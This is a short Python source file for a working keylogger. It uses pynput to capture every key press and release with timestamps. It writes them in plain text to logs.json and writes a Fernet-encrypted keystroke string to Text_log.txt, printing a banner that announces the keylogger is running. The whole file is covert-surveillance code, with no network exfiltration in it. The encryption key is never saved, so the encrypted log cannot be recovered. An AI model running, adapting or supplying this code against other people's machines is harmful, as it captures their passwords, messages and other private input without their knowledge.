from pynput import keyboard
import json
import time
import hashlib
from cryptography.fernet import Fernet


def generate_aes_key():
    return Fernet.generate_key()


def encrypt_data(data, key):
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data.encode())
    return encrypted_data


def decrypt_data(encrypted_data, key):
    cipher_suite = Fernet(key)
    decrypted_data = cipher_suite.decrypt(encrypted_data).decode()
    return decrypted_data

key_list = []
x = False
key_strokes = ""


aes_key = generate_aes_key()

def update_txt_file(key):
    encrypted_data = encrypt_data(key, aes_key)
    with open('Text_log.txt', 'wb') as key_strokes_file:
        key_strokes_file.write(encrypted_data)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=2)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Event': 'Pressed', 'Key': str(key), 'Timestamp': time.time()})
        x = True
    if x == True:
        key_list.append({'Event': 'Held', 'Key': str(key), 'Timestamp': time.time()})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Event': 'Released', 'Key': str(key), 'Timestamp': time.time()})
    if x == True:
        x = False
    update_json_file(key_list)
    key_strokes += str(key) + " "
    update_txt_file(str(key_strokes))

print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'\n[-] Saving the key logs in 'Text_log.txt'")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
